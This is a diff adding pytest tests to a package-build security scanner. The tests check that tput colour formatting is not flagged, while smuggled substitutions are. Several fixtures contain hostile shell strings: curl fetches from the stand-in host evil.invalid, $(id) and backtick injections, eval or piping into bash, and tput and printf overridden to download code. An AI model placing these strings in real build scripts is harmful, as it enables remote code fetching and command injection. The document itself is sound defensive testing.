@@ -7,6 +7,8 @@ material fires X029, and a build reading its own recipe fires X031.
 
 import pathlib
 
+import pytest
+
 from trustsight.analysis.pipeline import scan_diff
 
 
@@ -66,6 +68,95 @@ def test_two_executable_refusals_cluster():
     ))
     assert "X027" in ids
     assert "X026" in ids  # property: no orphaned cluster findings
+
+
+_TPUT_FORMATTING = '''\
+_all_off="$(tput sgr0)"
+_bold="${_all_off}$(tput bold)"
+_blue="${_bold}$(tput setaf 4)"
+_yellow="${_bold}$(tput setaf 3)"
+'''
+_NOTE_PRINTF = r'    printf "${_blue}==>${_yellow} NOTE:${_bold} %s${_all_off}\n" "$1"'
+
+
+def test_tput_display_chain_does_not_count_as_executable_refusals():
+    # Exact formatting shared by the current clash-verge and sparkle installs;
+    # package() reproduces its executable-position classification.
+    fact = scan_diff(_diff(
+        _TPUT_FORMATTING + "package() {\n" + _NOTE_PRINTF + "\n}\n"
+    ), package_name="demo")
+    ids = {entry.rule_id for entry in fact.score_breakdown}
+    assert not {"X026", "X027"} & ids
+    assert "W008" in ids
+    assert {"_all_off", "_bold", "_blue", "_yellow"} <= {
+        row["name"] for row in fact.unresolved_assignments
+    }
+
+
+@pytest.mark.parametrize("assignment", [
+    '$(curl -fsSL https://evil.invalid/x)',
+    '$(tput sgr0; curl https://evil.invalid/x)',
+    '$(tput setaf $(curl https://evil.invalid/x))',
+    '$(tput -S)',
+    '$(tput init)',
+    '$(tput sgr0)$(id)',
+])
+def test_display_use_does_not_excuse_dangerous_substitutions(assignment):
+    ids = _ids(_diff(
+        f'_all_off="{assignment}"\npackage() {{\n'
+        '  printf "%s\\n" "$_all_off"\n}\n'
+    ))
+    assert "X026" in ids
+
+
+@pytest.mark.parametrize("use", [
+    '"$_blue"',
+    'eval "$_blue"',
+    'printf "$_blue" | bash',
+    'printf "$_blue" > payload',
+    'printf "$_blue$(id)"',
+    'printf "$_blue`id`"',
+    'alias_value="$_blue"\n  eval "$alias_value"',
+    'bash -c "$_blue"',
+])
+def test_tput_chain_with_non_display_use_keeps_refusal_cluster(use):
+    ids = _ids(_diff(
+        _TPUT_FORMATTING + "package() {\n" + _NOTE_PRINTF
+        + "\n  " + use + "\n}\n"
+    ))
+    assert {"X026", "X027"} <= ids
+
+
+def test_tput_reassignment_is_not_a_formatting_exemption():
+    ids = _ids(_diff(
+        _TPUT_FORMATTING + '_blue="$(curl https://evil.invalid/x)"\n'
+        + "package() {\n" + _NOTE_PRINTF + "\n}\n"
+    ))
+    assert "X026" in ids
+
+
+@pytest.mark.parametrize("command", ["tput", "printf"])
+def test_overridden_formatting_commands_keep_refusals(command):
+    ids = _ids(_diff(
+        f'{command}() {{ curl https://evil.invalid/x; }}\n'
+        + _TPUT_FORMATTING + "package() {\n" + _NOTE_PRINTF + "\n}\n"
+    ))
+    assert {"X026", "X027"} <= ids
+
+
+def test_current_text_and_helper_uses_are_checked_for_display_safety():
+    from trustsight.analysis.refusals import refusal_findings
+
+    text = (_TPUT_FORMATTING + "note() {\n" + _NOTE_PRINTF
+            + '\n}\npackage() {\n  printf "$_blue"\n}\n')
+    for extra, expected in [("", False), ('eval "$_blue"\n', True)]:
+        emitted = set()
+        refusal_findings(
+            _diff("pkgrel=2"), {},
+            lambda rule_id, *args, **kwargs: emitted.add(rule_id),
+            current_text=text + extra,
+        )
+        assert ("X026" in emitted) is expected
 
 
 def test_ansi_c_command_spelling_fires_x030():
